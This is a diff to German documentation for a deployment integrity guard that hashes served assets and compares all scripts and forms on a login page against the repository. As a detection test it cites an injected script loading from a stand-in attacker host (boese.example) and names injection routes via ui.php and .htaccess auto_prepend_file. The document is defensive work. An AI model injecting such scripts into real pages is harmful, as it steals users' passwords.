@@ -47,18 +47,41 @@ statt ihn stillschweigend zu übergehen.
 
 | Teil | Frage |
 |---|---|
-| Selbstprobe | Erkennt sie eine Abweichung überhaupt? Sieben Erwartungen, ohne Netz |
+| Selbstprobe | Erkennt sie eine Abweichung überhaupt? Zwölf Erwartungen, ohne Netz — darunter fünf ausdrücklich „Abweichung erkannt" |
 | 1 | Jede Datei unter `server/assets/` (ohne `.md`) — SHA-256 der Auslieferung gegen die des Repositoriums |
-| 2 | Die PHP-freien Inline-Skriptblöcke der unangemeldet erreichbaren Seiten (`login.php`) |
+| 2 | Die **ganze Menge** der Skripte und Formulare der Anmeldeseite (`login.php`): jeder `<script src>`, jeder Inline-Block, jedes `<form>`-Tag — nichts darf fehlen, verändert sein **oder dazukommen** |
+
+**Warum Teil 2 die ganze Menge vergleicht und nicht nur das Bekannte.** Auf
+der Anmeldeseite zählt der **Weg des Passworts**, und der hat genau zwei
+Enden: die Skripte, die es lesen, und das Formular, das es abschickt. Die
+erste Fassung dieser Wache prüfte nur, ob der bekannte Inline-Block
+*vorhanden* ist. Ein **zusätzliches** Skript — eingeschleust über `ui.php`,
+über `auto_prepend_file` in einer veränderten `.htaccess`, über einen zweiten
+`<script src>` — fiel ihr nicht auf; ein Formular mit fremdem `action` auch
+nicht. Beides kostet den Angreifer eine Zeile und schickt das Passwort beim
+nächsten Anmelden mit. Gefunden beim Nachprüfen der Frage „welche Lücke
+schließt das eigentlich?" (07.09.2026), belegt am laufenden System: ein
+`<script src="https://boese.example/x.js">` über `ui_seite_ende()` in jede
+Seite eingeschleust — die erste Fassung meldete **„Kein Unterschied"**, die
+jetzige **„ZUSÄTZLICHES Skript in der Auslieferung: https://boese.example/x.js"**,
+Rückgabewert 1.
+
+Die Selbstprobe hat dabei gleich einen zweiten Fehler gefunden: Das
+`src`-Muster brach am Anführungszeichen **innerhalb** von `asset('…')` ab und
+hielt das eine externe Skript der Quelle für „unbestimmbar" — und ließ dann
+jeden Ersatz dafür durch. Behoben, bevor es eingecheckt war.
 
 **Die Selbstprobe läuft in der Action zuerst**, und das ist kein Formalismus:
 Ein grüner Lauf einer Wache, die *immer* grün meldet, sieht genauso aus wie
 einer, der nichts gefunden hat.
 
 Gemessen am 07.09.2026 gegen die lokale Installation: **112 Dateien, 112
-gleich, 1 Inline-Block gleich, 0 nicht vergleichbar**. Gegenprobe mit **einer**
-veränderten Kennung in `crypto.js` (37 434 B, Länge unverändert): **111 gleich,
-1 abweichend**, Rückgabewert 1, mit Dateiname und beiden Summen.
+gleich; 1 Inline-Block, 1 externes Skript, 1 Formular gleich, nichts zu
+viel**. Gegenprobe mit **einer** veränderten Kennung in `crypto.js` (37 434 B,
+Länge unverändert): **111 gleich, 1 abweichend**, Rückgabewert 1, mit
+Dateiname und beiden Summen. Gegenprobe mit einem über `ui.php`
+eingeschleusten Fremd-Skript: **1 zusätzliches Skript** gemeldet,
+Rückgabewert 1.
 
 ## Wann sie läuft
 
@@ -95,7 +118,17 @@ und fasst die Workflow-Datei nicht an.
   `User-Agent`), täuschte sie. Dagegen gibt es hier kein Mittel; es wäre ein
   erheblich aufwendigerer Angriff als der, gegen den sie gebaut ist.
 - **Sie sieht keinen PHP-Code.** Was der Server rechnet, bleibt unsichtbar —
-  außer dem Inline-Block der Anmeldeseite.
+  außer dem, was davon auf der Anmeldeseite ankommt: Skripte und Formulare.
+- **Sie vergleicht die Anmeldeseite, nicht jede Seite.** Ein Skript, das
+  `ui.php` in jede Seite einschleust, fällt dort auf; eines, das nur auf einer
+  angemeldeten Seite erscheint, nicht. Dort liegt der Inhaltsschlüssel schon
+  im Browser — das ist die Grenze, an der die Wache endet und die CSP
+  (Backlog Nr. 8, P5) anfängt.
+- **Sie vergleicht keine Stylesheets und keine übrigen HTML-Änderungen.**
+  Die Datei `assets/style.css` selbst ist über Teil 1 geprüft; ob die Seite
+  ein *zusätzliches* Stylesheet lädt oder ihr Markup sonst geändert ist, sieht
+  sie nicht. Ohne Skript und ohne Formular verlässt das Passwort die Seite
+  nicht — deshalb reichen die beiden.
 - **Sie sieht nicht, ob der Deploy vollständig war.** Eine Datei, die es im
   Repositorium gibt und auf dem Server nicht, meldet sie als „nicht
   erreichbar" — das ist derselbe rote Lauf, aber die andere Ursache.
